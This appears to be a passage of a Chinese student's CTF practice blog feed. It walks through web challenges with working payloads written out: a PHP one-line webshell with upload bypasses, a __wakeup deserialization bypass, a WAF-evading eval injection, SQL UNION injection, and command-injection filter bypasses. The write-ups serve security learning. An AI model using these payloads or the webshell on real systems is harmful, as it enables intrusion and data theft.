alt="54.png"><br>它再一次验证了文件类型，要求我们的文件内容必须是image，但是一句话木马怎么可能是图片呢，这时我们也不能再修改Content-Type，而是要让检测认为我们这个是图片。这就要用到图片头文件欺骗。  </p><hr><h2 id="GIF89a图片头文件欺骗"><a href="#GIF89a图片头文件欺骗" class="headerlink" title="GIF89a图片头文件欺骗"></a>GIF89a图片头文件欺骗</h2><p> 一个GIF89a图形文件就是一个根据图形交换格式（GIF）89a版（1989年7 月发行）进行格式化之后的图形。在GIF89a之前还有87a版（1987年5月发行），但在Web上所见到的大多数图形都是以89a版的格式创建的。 89a版的一个最主要的优势就是可以创建动态图像，例如创建一个旋转的图标、用一只手挥动的旗帜或是变大的字母。特别值得注意的是，一个动态GIF是一个 以GIF89a格式存储的文件，在一个这样的文件里包含的是一组以指定顺序呈现的图片。  </p><hr><p>所以我们只要在文件内容开头加上GIF89a就可以让检测时认为文件是图片，从而绕过判断。<br><img src="https://i.loli.net/2021/01/27/6LtxHIebY8CRgwA.png" alt="55.png"><br>可以看到它说我们上传的是txt文件，但是我们是php代码写成的一句话木马，txt文件明显无法运行我们的代码，我们要改成php文件，所以我先把filename后缀改为了.php但是被拦截了，这说明php被过滤了，但是并非只能上传php。还可以上传别的来绕过，这里给出常见的黑白名单。  </p><blockquote><p>phtml php3 php4 php5 Php php (空格) php.，pphphp</p></blockquote><p>发现phtml可以上传成功。<br><img src="https://i.loli.net/2021/01/27/iwFoTvc3RpdyBNK.png" alt="56.png"><br>接下来就是用剑蚁连接这个后门了，这里注意连接的url地址后面要加上上传的路径，否则我们输入密码也无法执行我们的木马后门。  </p><blockquote><p>…/upload/shell.phtml</p></blockquote><p>连接成功后直接在根目录就能找到flag。  </p><hr><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>文件上传漏洞是ctf中常见的较为简单的题目，主要就是各种的绕过，这些绕过都很考验积累。所以做这种题目积累是必不可少的。下面给出一些关于文件上传绕过的积累博客。<br><a href="https://blog.csdn.net/weixin_44940180/article/details/108087344">文件上传绕过</a><br><a href="https://blog.csdn.net/weixin_40709439/article/details/90142285">文件上传绕过总结</a><br>同时附上一句话的变形积累<br><a href="https://blog.csdn.net/bylfsj/article/details/101227210">php一句话木马变形技巧</a></p>]]></content>
      
      
      <categories>
          
          <category> test19 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假练习12</title>
      <link href="test18/undefined-undefined.html"/>
      <url>test18/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天科目三还是挂了（心态炸了了了了了了了）但是每日一题还是不能落下（hhhh）。  </p><h1 id="极客大挑战-2019-PHP-1"><a href="#极客大挑战-2019-PHP-1" class="headerlink" title="[极客大挑战 2019]PHP 1"></a>[极客大挑战 2019]PHP 1</h1><p>打开题目，发现这样一个界面。<br><img src="https://i.loli.net/2021/01/26/Bqr97GaewV2yZlb.png" alt="43.png"><br>提示我们说文件备份了，那么我们第一步就是找出网页备份的文件。<br>看到别人的wp都是用软件工具扫描出来文件的，我是从网上找到了一个python小脚本找到的。<br>在找备份文件之前，我们要知道一些常见的网站源码备份文件后缀和文件名。<br><img src="https://i.loli.net/2021/01/26/Xcw2RKEa6O7yDCf.jpg" alt="20200823094336965.jpg"><br>接下来给出我白嫖的小脚本。  </p><pre><code>import requestsurl = &quot;http://acafbeb4-1e4b-4d38-8923-96ce6dd6453e.node3.buuoj.cn/&quot;li1 = [&#39;web&#39;, &#39;website&#39;, &#39;backup&#39;, &#39;back&#39;, &#39;www&#39;, &#39;wwwroot&#39;, &#39;temp&#39;]  li2 = [&#39;tar&#39;, &#39;tar.gz&#39;, &#39;zip&#39;, &#39;rar&#39;]  for i in li1:      for j in li2:          url_ final = url + &quot;/&quot; + i + &quot;.&quot; + j          r = requests.get(url_final)          print(r)  </code></pre><p>这个脚本是列了两个小表，然后排列组合一个个试，其实那些软件的原理类似，只不过有更全面的字典，扫出来的可能性更高，脚本跑完后，从返回的信息可以看到找到了网站的源码备份文件名和后缀。<br><img src="https://i.loli.net/2021/01/26/XLuVT97HhBlc1fn.png" alt="44.png"><br>可以得知，返回200的组合为<a href="http://www.zip,所以在网页url后面输入www.zip就可以得到备份文件./">www.zip，所以在网页url后面输入www.zip就可以得到备份文件。</a><br><img src="https://i.loli.net/2021/01/26/RLrGptETHaqN7gS.png" alt="45.png"><br>打开这个压缩包，里面有三个php文件引人注意。<br><img src="https://i.loli.net/2021/01/26/aHDCBJmE3Unrzwp.png" alt="46.png"><br>先打开flag.php，直觉告诉我里面的内容不是真的flag，上交了一下果然如此。那么就再打开index.php文件。<br><img src="https://i.loli.net/2021/01/26/ArvpGHktOq9LRIu.png" alt="47.png"><br>通过代码可以得知包含了class.php文件，并且以get方式上传变量select，但是这个unserialize（）函数是最重要的，它是一个反序列化函数，这也就是要求我们上传的字符是序列化过的。这里要先简单讲一下序列化。  </p><hr><h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p>序列化在jave中很重要，把对象转换为字节序列的过程称为对象的序列化，但是目前在我做过的ctf题目中，对序列化可以理解为把对象编码，在php里要用到serialize() 函数，这个函数用于序列化对象或数组，并返回一个字符串。  </p><hr><p>接下来我们查看class.php文件。<br><img src="https://i.loli.net/2021/01/26/Is7YHx2B94r1lwp.png" alt="48.png"><br>代码不复杂，定义了一个类为Name，可以知道最终的要求是要我们令password=100，username=admin。并将这个Name类序列化，一开始想的很简单，立刻使用函数进行序列化。<br><img src="https://i.loli.net/2021/01/26/UwgsX3IQJ49VnDZ.png" alt="49.png"><br>这个序列化是比较粗糙的，不规范的。下面说一下具体格式。  </p><blockquote><p>O:(类字符串长度):”(类名字)”:(类存在的不同属性个数):{序列化的字符串}</p></blockquote><p>所以最后的结果是这样的。  </p><blockquote><p>O:4:”Name”:2:{s:8:”username”;s:5:”admin”;s:8:”password”;i:100;}</p></blockquote><p>但是当我这样构造payload时却什么也没显示。应该是哪里出了问题，再一次检查代码，发现一个有点不同的函数**function __wakeup()**，这是一个php的魔法函数，当使用unserialse()函数时会被自动调用，通过代码可以知道，它会将我们的username改为guest而不是admin，所以我们什么也没有显示。<br>那么接下来我们就要绕过这个函数了，这里给出绕过方法  </p><blockquote><p>wakeup()漏洞就是与整个属性个数值有关。当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过wakeup的执行。</p></blockquote><p>也就是说如果我们把属性2改为3，那么它就会跳过这个函数的执行。所以重新构造payload。  </p><blockquote><p>O:4:”Name”:3:{s:8:”username”;s:5:”admin”;s:8:”password”;i:100;}</p></blockquote><p>可这次却被禁止访问了。<br><img src="https://i.loli.net/2021/01/26/ExKbkNQ9nmjqD3p.png" alt="50.png"><br>从显示的界面可以知道是password出了问题，但是再三检查还是不知道为什么会出错，这时候在网上看到了序列化的三种不同类型：Private类型，Protected类型，public类型，这三个类型序列话后的格式也不同。  </p><blockquote><p>pubulic类型：就是上面正常的格式<br>Private类型：属性名变为”%00类名%00属性名”这里的%00是空格的url编码。<br>protected类型:属性名变为”%00*%00属性名”  </p></blockquote><p>显然，因为属性名的变化，那么属性名的长度也会变化，因为代码中变量修饰用的是private，所以我们重新构造一下payload。  </p><blockquote><p>O:4:”Name”:3:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;i:100;}</p></blockquote><p>这次再上传就没有问题了，得到flag。  </p><hr><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题目主要还是考的序列化，同时还有恢复网站源码备份文件，和之前做过的序列化不同的是这次题目更加细节，考察了魔法函数的绕过和变量的修饰不同类型，关于反序列化还有更多知识点，魔法函数也不止这一个，绕过的方式也有很多。这些都要不断积累。<br>下面附上相关博客，以便深入学习。<br><a href="https://blog.csdn.net/qq_36551991/article/details/109297826?ops_request_misc=&request_id=&biz_id=102&utm_term=%E4%BB%80%E4%B9%88%E6%98%AF%E5%BA%8F%E5%88%97%E5%8C%96&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-8-109297826.pc_search_result_before_js&spm=1018.2226.3001.4187">看完你就懂什么是序列化和反序列化了</a><br><a href="https://blog.csdn.net/u011215133/article/details/51177843?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161166468616780274140083%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161166468616780274140083&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-8-51177843.pc_search_result_before_js&utm_term=%E5%BA%8F%E5%88%97%E5%8C%96&spm=1018.2226.3001.4187">什么是序列化，为什么要序列化。</a><br><a href="https://blog.csdn.net/m0_46383107/article/details/109770976">浅谈反序列漏洞</a></p>]]></content>
      
      
      <categories>
          
          <category> test18 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假练习11</title>
      <link href="test17/undefined-undefined.html"/>
      <url>test17/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天又练了一天科三，明天就要考科三了，所以有可能明天更新不了博客了。（不知道啥时候能考完…）<br>今天这道题和我加入实验室的新生测试差不多。比较简单。  </p><h1 id="极客大挑战-2019-Http-1"><a href="#极客大挑战-2019-Http-1" class="headerlink" title="[极客大挑战 2019]Http 1"></a>[极客大挑战 2019]Http 1</h1><p>打开题目，发现是一个安全技术小组的介绍，而且又没有什么可以点击的地方，于是启动我们的f12大法。<br>再一番查找后，终于找到了一个比较可疑的php文件，好家伙，在文字中插入一串代码，文件名字还叫secre，毫不犹豫打开它。<br><img src="https://i.loli.net/2021/01/25/ab7qiJ4O9zwM6nj.png" alt="9.png"><br>打开之后出现这样的提示。<br><img src="https://i.loli.net/2021/01/25/FSZ7XR3HCWvu1DY.png" alt="10.png"><br>页面说我不是来自<a href="https://www.sycsecret.com的网址访问的.这样的语句让我想到了做过的实验室招新题.毫无疑问,我们是要伪造一下我们的访问请求信息的,这时就要用到我们的抓包工具了./">https://www.Sycsecret.com的网址访问的。这样的语句让我想到了做过的实验室招新题。毫无疑问，我们是要伪造一下我们的访问请求信息的，这时就要用到我们的抓包工具了。</a><br>我们可以看到我们向web服务器发送的请求和其他正常的请求中少了Referer这一信息。<br><img src="https://i.loli.net/2021/01/25/x45KTFBdeEIHYMi.png" alt="11.png"><br>先简单讲一下什么是Referer吧。  </p><hr><h2 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h2><p>Referer  是  HTTP  请求header 的一部分，当浏览器（或者模拟浏览器行为）向web 服务器发送请求的时候，头信息里有包含  Referer  。比如我在<a href="http://www.google.com/">www.google.com</a> 里有一个<a href="http://www.baidu.com/">www.baidu.com</a> 链接，那么点击这个<a href="http://www.baidu.com/">www.baidu.com</a> ，它的header 信息里就有：<br>Referer=<a href="http://www.google.com/">http://www.google.com</a><br><strong>那为什么这个请求信息中没有Referer呢？</strong>  </p><blockquote><p>根据Referer的定义，它的作用是指示一个请求是从哪里链接过来，那么当一个请求并不是由链接触发产生的，那么自然也就不需要指定这个请求的链接来源。<br>比如，直接在浏览器的地址栏中输入一个资源的URL地址，那么这种请求是不会包含 Referer  字段的，因为这是一个“凭空产生”的 HTTP  请求，并不是从一个地方链接过去的。</p></blockquote><p>这也说明了为什么这道题目的链接是直接给出来需要复制粘贴的，而不是直接在网站可以点击跳转的（如果是点击跳转那么就会有Referer=网站网址）。  </p><hr><p>那么题目现在要求我们要是从<a href="https://www.sycsecret.com而来的,那么我们在请求信息中加上该referer信息就可以了./">https://www.Sycsecret.com而来的，那么我们在请求信息中加上该Referer信息就可以了。</a>  </p><blockquote><p>Referer: <a href="https://www.sycsecret.com/">https://www.Sycsecret.com</a></p></blockquote><p><img src="https://i.loli.net/2021/01/25/WOje7RCS1U5QoHu.png" alt="12.png"><br>可以看到页面接下来显示我用的不是Syclover浏览器访问的。(browser是浏览器的意思。。。)<br>那么我们就在请求信息中修改一下浏览器信息，把20100101 Firefox改为Syclover。再次发送请求。<br><img src="https://i.loli.net/2021/01/25/cQuwBygNjCxfFV4.png" alt="13.png"><br>页面又向我们提出了新要求，我们只能在本地访问到flag，也就是说我们的ip地址要是本地的，这就要求我们伪造一下ip地址，这里要用到HTTP 请求头中的 X-Forwarded-For，它代表了HTTP的请求端真实的IP，但是请求头中的这个是可以伪造的，于是我们可以这样输入  </p><blockquote><p>X-Forwarded-For: 127.0.0.1</p></blockquote><p>这样就可以得到flag。<br>注意，这串信息在请求信息中的位置不能随意改变，如果它的位置改变，可能会无法成功返回信息。<br><img src="https://i.loli.net/2021/01/25/edyBVIJMabfk75C.png" alt="14.png"></p><hr><p>这道题目难度不是很高，注要让人了解了更多关于HTTP的相关知识，下面附上讲解博客，以便深入学习。<br><a href="https://blog.csdn.net/m0_37542889/article/details/82889721?ops_request_misc=&request_id=&biz_id=102&utm_term=X-Forwarded-For&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-82889721.pc_search_result_no_baidu_js&spm=1018.2226.3001.4187">HTTP 请求头中的 X-Forwarded-For</a><br><a href="https://blog.csdn.net/shenqueying/article/details/79426884?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161157865216780266213772%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161157865216780266213772&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-79426884.pc_search_result_no_baidu_js&utm_term=referer&spm=1018.2226.3001.4187">http请求头中Referer的含义和作用</a></p>]]></content>
      
      
      <categories>
          
          <category> test17 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假练习10</title>
      <link href="test16/undefined-undefined.html"/>
      <url>test16/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>这道题是目前来说比较难的一道题目了。  </p><h1 id="RoarCTF-2019-Easy-Calc-1"><a href="#RoarCTF-2019-Easy-Calc-1" class="headerlink" title="[RoarCTF 2019]Easy Calc 1"></a>[RoarCTF 2019]Easy Calc 1</h1><p>打开题目发现是一个计算器，经过测试后发现只能输入数字和运算符来进行计算，如果输入别的字符就会出错，提示无法计算。所以说没有办法对这个计算器来做手脚了。<br><img src="https://i.loli.net/2021/01/24/gSk4xlcGKhHXfuQ.png" alt="1.png"><br>那么就先查一下源码吧，发现源码中有两段字符让我比较在意.<br><img src="https://i.loli.net/2021/01/24/iFupOXBgSCdMKWf.png" alt="2.png"><br>可以看到代码中说道已经设置了waf来保护网页安全，同时下面是这个计算机的代码。<br>WAF是什么呢，我们先了解一下这个。  </p><hr><p><strong>WAF(Web Application Firewall，web应用防火墙）</strong>，现在稍微大一点或者具有安全意识的网站管理都会配备WAF，来防止自己的网站受到攻击。  </p><h2 id="WAF分类"><a href="#WAF分类" class="headerlink" title="WAF分类"></a>WAF分类</h2><blockquote><p>软件WAF：以软件形式装在所保护的服务器WAF，由于安装在服务器中，可以接触到服务器内部文件，直接检测服务器是否存在病毒，webshell，文件是否创建，删除，被利用等。<br>硬件WAF：以硬件形式部署在链路中，当串联到链路中可以拦截恶意流量，在旁路监听模式时只记录攻击而不拦截<br>云WAF:一般是反向代理的形式工作，通过配置NS记录，让对网站的请求数据先经过WAF主机，经过审核验证过的无害数据再发送给网站服务器进行请求，类似带防护功能的CDN。<br>网站系统内置的WAF：能起到审核防护的内置代码，比如前段JS认证，后端的过滤函数，过滤数据库查询语句的代码，对前端输入的参数合法性进行判断。  </p></blockquote><hr><p>也就是说相当于一个防火墙，防止别人的攻击，再看到计算机代码中有  </p><blockquote><p>url:”calc.php?num=”+encodeURIComponent($(“#content”).val()),</p></blockquote><p>这样一句，所以我们推测这个calc.php文件就是这个网站的保护代码，那么就打开这个文件。<br><img src="https://i.loli.net/2021/01/24/gJur3bzaK4BCWqT.png" alt="3.png"><br>果然如此，我们可以看到这个计算器网站对一些字符进行了过滤，先以get的方式传参num这个变量。再将这个变量的值赋给$str，再对str这个变量进行正则匹配过滤。<br>同时我们可以看到，代码结尾有  </p><blockquote><p>eval(‘echo ‘.$str.’;’); </p></blockquote><p>这样一句代码，这明显就是一个命令执行的漏洞，我们可以利用它来输入php代码来执行，从而得到flag。<br>于是我先构造了一个payload。  </p><blockquote><p>?num=system(‘ls’)</p></blockquote><p><img src="https://i.loli.net/2021/01/24/zBWe9AvJiQxLYgX.png" alt="4.png"><br>发现报错了，这是哪里出了问题呢?<br>结合之前在计算器网页上不能输入除了数字以外的字符可以得知，WAF要求我们上传的变量num必须是数字，但是我们要想得到目录和flag必须要上传字符串，所以这里我们要绕过这个检查。<br>看了别人的讲解，知道了这里要用到<strong>PHP的字符串解析特性</strong>    </p><hr><h2 id="PHP的字符串解析特性"><a href="#PHP的字符串解析特性" class="headerlink" title="PHP的字符串解析特性"></a>PHP的字符串解析特性</h2><blockquote><p>我们知道PHP将查询字符串（在URL或正文中）转换为内部$ _ GET或的关联数组$ _ POST。<br>例如：/?foo=bar变成Array([foo] =&gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。<br>例如,/?%20news[id%00=42会转换为Array([news _ id] =&gt; 42)。如果一个IDS/IPS或WAF中有一条规则是当news _ id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：<br>/news.php?%20news[id%00=42”+AND+1=0–<br>上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news _ id”]中。</p></blockquote><p>简而言之，PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事  </p><blockquote><p>1.删除空白符<br>2.将某些字符转换为下划线（包括空格)</p></blockquote><hr><p>简单了解后我们可以知道这样的绕过方法：<br>因为WAF不允许我们上传字母，所以当我们输入字母上传时会显示错误。但是又因为PHP在解析查询字符串时会删掉空白符，那么如果我们构造payload时在num前面加上一个空格，那么就成了下面这样  </p><blockquote><p>?+num=system(‘ls’)（加号在解析时同样会被当成空格删掉，所以可以代替空格）</p></blockquote><p>这样在通过WAF时它便找不到num这个变量，因为这次我们上传的是+num这个变量，所以它也不会对我们上传的字符进行过滤，但是当PHP执行时，它会将前面的空格删掉，此时变量又变回了num，这样就可以在这个php文件中进行正则匹配后执行我们输入的代码。<br>接着我们试一下?+num=system(‘ls’)。<br><img src="https://i.loli.net/2021/01/24/dhXeFG6NrCuJf2s.png" alt="5.png"><br>因为过滤了单引号“’”这个字符，所以没有成功，但是这也说明我们绕过了WAF，但是我们要如何查看文件目录呢。（通过查看phpinfo发现system（）函数也被禁止使用了）<br>接下来就要介绍一下几个个新的函数。  </p><hr><p><strong>var_dump() 函数</strong>——用于输出变量的相关信息。<br><img src="https://i.loli.net/2021/01/24/kG6b74fzmUeOnR2.png" alt="6.png"><br><strong>scandir() 函数</strong>——用于返回指定目录中的文件和目录的数组。<br><img src="https://i.loli.net/2021/01/24/TXZIGqDnExp8BwA.png" alt="7.png"><br><strong>file_ get _contents() 函数</strong>——把整个文件读入一个字符串中。<br><strong>chr（）函数</strong>——将用一个范围在 range（256）内的（就是0～255）整数作参数，返回一个对应的字符。返回值是当前整数对应的ASCII字符</p><hr><p>这三个函数将代替我们实现system函数的作用。<br>我们先构造这样一个payload：  </p><blockquote><p>?+num=var_dump(scandir(chr(47)))</p></blockquote><p>这里的chr函数是将/这个字符返回（因为/被正则匹配过滤了），所以当php解析后的语句是这样的  </p><blockquote><p>?num=var_dump(scandir(/))</p></blockquote><p>scandir(/)将列出所有的的目录并返回到Array这个数组中，而var_dump（)将会把Array这个数组里的信息输出，这样我们就能得到所有目录了。<br><img src="https://i.loli.net/2021/01/24/chekxbqVAJY784f.png" alt="8.png"><br>我们在目录中找到了f1agg这个文件，这里面应该就是flag了，我们再使用file _ get _ contents() 函数读出里面的内容。就可以得到flag。  </p><blockquote><p>?+num=file_get _contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</p></blockquote><p>这里我尝试直接输入f1agg发现不能读出，还是需要使用chr（）函数绕过，但是原因不知道为什么。  </p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题牵扯到不少知识点，关于WAF的绕过，PHP的字符串解析特性，正则匹配的绕过，使用其他函数来实现system（）函数的功能，以后的题目中会有越来越多这样的多个函数的嵌套使用，还是要做足积累才行。<br>另外附上讲解的博客，以便深入了解。<br><a href="https://blog.csdn.net/qq_44040833/article/details/104196386?ops_request_misc=&request_id=&biz_id=102&utm_term=WAF&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-7-104196386.pc_search_result_before_js&spm=1018.2226.3001.4187">关于WAF</a><br><a href="https://www.freebuf.com/articles/web/213359.html">利用PHP的字符串解析特性</a></p>]]></content>
      
      
      <categories>
          
          <category> test16 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入闯关3</title>
      <link href="test15/undefined-undefined.html"/>
      <url>test15/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天再来一个sql闯关（发现这几天都没怎么复习巩固sql注入了）  </p><h1 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h1><p>这道题让我知道了其他的闭合方式。<br>之前我们做的前两关后台代码执行的sql语句是这样的  </p><blockquote><p>$sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;</p></blockquote><p>这也就是说我们在构造payload时，在?id=999后面为什么要加上一个’，结尾要以注释符号结尾的原因，因为这样构造的执行的最终的sql语句是这样的。  </p><blockquote><p>“SELECT * FROM users WHERE id=’999’ order by 4–+’</p></blockquote><p>这里999后面的单引号就是我们加上去的，而最后的单引号是原语句的，因为在注释符后面，所以不会被当成错误而报错。<br>同样的整形注入时后台的sql语句是这样的。  </p><blockquote><p>$sql=”SELECT * FROM users WHERE id=$id LIMIT 0,1”;</p></blockquote><p>可以看到，这里的$id变成了数字，所以我们就不需要再在?id=999后面加上单引号，结尾也不需要加上注释符了。  </p><hr><p>那么再来看看今天这道题目，它的后台sql语句是这样的。  </p><blockquote><p>$sql=”SELECT * FROM users WHERE id=(‘$id’) LIMIT 0,1”;</p></blockquote><p>也就是多出了一对括号，而我们注入时这个括号是存在的，也就是说我们构造时要在/?id=999后面加上’）来和前面的括号闭合，除此之外也就没有什么和别的不同的地方了。<br>查字段</p><blockquote><p>?id=1’） order by 4–+</p></blockquote><p>回显错误，所以只有三个字段。<br>接下来爆库名  </p><blockquote><p>?id=1’ union select 1,2,database()–+</p></blockquote><p>爆表名</p><blockquote><p>?id=1’ union select 1,(select group _concat(table _name) from information _schema.tables where table _  schema=’security’),database()–+</p></blockquote><p>爆字段 </p><blockquote><p>select group_ concat(column_name) from information _ schema.columns where table _name=’users’ </p></blockquote><p>爆字段信息  </p><blockquote><p>select group_ concat(username) from security.users<br>select group_ concat(password) from security.users</p></blockquote><hr><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这道题和之前的没什么区别，主要还是在这个闭合上要进行试探。</p>]]></content>
      
      
      <categories>
          
          <category> test15 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假练习9</title>
      <link href="test14/undefined-undefined.html"/>
      <url>test14/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天原本像做那道easy_tornado的题，但是搞了半天，看了别人的wp依旧是半知不解，感觉要彻底了解这道题还需要知道不少别的从没见过的东西（我太菜了），所以就先放一下那道题，先往后写吧。  </p><h1 id="极客大挑战-2019-Knife-1"><a href="#极客大挑战-2019-Knife-1" class="headerlink" title="[极客大挑战 2019]Knife 1"></a>[极客大挑战 2019]Knife 1</h1><p>其实这道题很简单，但是不知道为什么做出来的人数这么少，估计是别人不屑于做这道题吧。。。。。<br>打开界面，直接说出来了菜刀二字，是上传一句话没跑了。更友善的是这道题直接把一句话木马给你了，都不用自己写，而且给了你上传的方法。<br>（这么好的题目我哭了）<br><img src="https://i.loli.net/2021/01/23/mnZ4IiADqey7Hbx.png" alt="62.png"><br>虽然有些不敢相信，但是还是直接post把一句话传了过去，接着就是使用剑蚁进行连接，密码也就是syc。<br>接着我们尝试连接一下。<br><img src="https://i.loli.net/2021/01/23/5Sdj4vLFbZJKgxN.png" alt="63.png"><br>真的成功了。这题就是这么简单，接着在根目录下找到flag文件就行了。  </p><hr><h2 id="关于一句话木马"><a href="#关于一句话木马" class="headerlink" title="关于一句话木马"></a>关于一句话木马</h2><p>这个一句话木马也是web中见到很多次的一个进入对方后台的手段了。其原理其实比较简单。当后台代码对在网页上上传的文件没有进行检测时，我们可以上传<br><?php  @eval($_REQUEST['shell']);  ?><br>这样的一个php文件(改后缀为php)。而这样的一句代码就可以让我们使用get或者post的传参方式传给shell这个参数，让它来执行一些命令。当然这样子一次次的输入命令有些麻烦，这时利用中国菜刀或者剑蚁这些工具就可以更加简单直观的看到该网站下的所有文件，不用再输入命令来一一查看。<br>更多详细的的讲解在这篇博客里：<br><a href="https://blog.csdn.net/qq_41500251/article/details/100177972?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161139862016780261976336%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161139862016780261976336&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-100177972.pc_search_result_before_js&utm_term=%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%8E%9F%E7%90%86&spm=1018.2226.3001.4187">一句话木马原理</a></p>]]></content>
      
      
      <categories>
          
          <category> test14 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假练习8</title>
      <link href="test13/undefined-undefined.html"/>
      <url>test13/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天在外面科目三模拟，结果还是啥都不会（要有开车PTSD了）。<br>接着昨天的Linux命令，今天再来一道吧。今天这道题相较于昨天多了绕过过滤这一项。所以还要整理绕过的相关笔记。附上笔记链接。  </p><hr><p><a href="https://blog.csdn.net/weixin_43818995/article/details/108655588?ops_request_misc=&request_id=&biz_id=102&utm_term=$IFS$9&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-6-108655588.pc_search_result_before_js&spm=1018.2226.3001.4187">web安全原理PHP命令执行漏洞基础</a><br><a href="https://www.ghtwf01.cn/index.php/archives/273/#menu_index_5">命令执行漏洞利用及绕过方式</a>  </p><hr><h1 id="GXYCTF2019-Ping-Ping-Ping-1"><a href="#GXYCTF2019-Ping-Ping-Ping-1" class="headerlink" title="[GXYCTF2019]Ping Ping Ping 1"></a>[GXYCTF2019]Ping Ping Ping 1</h1><p>接下来看下这个题目，打开题目，发现让我们ping一个网址。<br><img src="https://i.loli.net/2021/01/23/s4hfWVF37ucgxH8.png" alt="58.png"><br>随便输入一个网址，发现有回显成功。那么先看一下有啥文件。<br><img src="https://i.loli.net/2021/01/23/xHlPwB4gqYIZ1UA.png" alt="59.png"><br>先看一下源码文件（index.php）。输入</p><blockquote><p>/?ip=127.0.0.1;cat index.php</p></blockquote><p>发现它提示我们过滤了空格。<br><img src="https://i.loli.net/2021/01/23/xIMm1StYweH3dfn.png" alt="60.png"><br>那么我们要绕过空格过滤，下面提供了几种Linux下绕过空格的方式。  </p><blockquote><p>cat${IFS}flag.txt<br>cat$IFS$9flag.txt<br>cat&lt;flag.txt<br>cat&lt;&gt;flag.txt  </p></blockquote><p>还有很多绕过方法，在上面附上的博客里都有讲解，这里不多介绍了。一一测试后发现输入cat$IFS$9flag.txt成功绕过。看到源码。<br><img src="https://i.loli.net/2021/01/23/ENrs4eYHMfpIWRb.png" alt="61.png"><br>看到它过滤了很多字符，这也解释了为什么上面几个绕过不成功。<br>同时我们也看到它过滤了flag这个字符，这也就要求我们用别的方式绕过并输入flag。下面提供几个方式。  </p><hr><h2 id="1-构造变量法："><a href="#1-构造变量法：" class="headerlink" title="1.构造变量法："></a>1.构造变量法：</h2><blockquote><p>构造如下payload<br>?ip=127.0.0.1;b=ag;a=fl;cat$IFS$1$a$b.php<br>即可获取flag</p></blockquote><p>可以看到我们构造了两个变量a，b，然后再在后面引用他们，他们合起来时依旧是flag这个字符，这样仍然可以执行并且不会被匹配到。但是我们注意到a，b变量的顺序有些不对，那是因为源码中的  </p><pre><code>if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;      die(&quot;fxck your flag!&quot;);</code></pre><p>这个匹配，它的意思是如果f，l，a，g这四个字母按照顺序出现，那么就被过滤掉。所以说如果我们按照正常的顺序定义变量a=fl，b=ag；这时flag这四个字母按照顺序出现了，于是就没办法通过匹配。也就得不到flag。  </p><hr><h2 id="2-bush，sh命令法。"><a href="#2-bush，sh命令法。" class="headerlink" title="2.bush，sh命令法。"></a>2.bush，sh命令法。</h2><p>bush和sh是Linux里的命令，用来执行shell的命令，这里我们先将cat flag.php进行base64编码。  </p><blockquote><p>/?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d</p></blockquote><p>这个payload后一句相当于一句shell脚本，也就是一个小脚本，它将cat flag.php这句被编码过的语句进行解码执行后输出。所以最终的执行语句应该是  </p><blockquote><p>echo cat flag.php  </p></blockquote><p>但是这样一个脚本需要sh或者bush命令来启动执行，过滤了bush还有sh可以使用，我们使用管道符让这些语句连接起来。  </p><hr><h2 id="3-内联执行"><a href="#3-内联执行" class="headerlink" title="3.内联执行"></a>3.内联执行</h2><p>这个是大佬的方法，构造以下payload  </p><blockquote><p><code>/?ip=127.0.0.1;cat$IFS$9`ls` 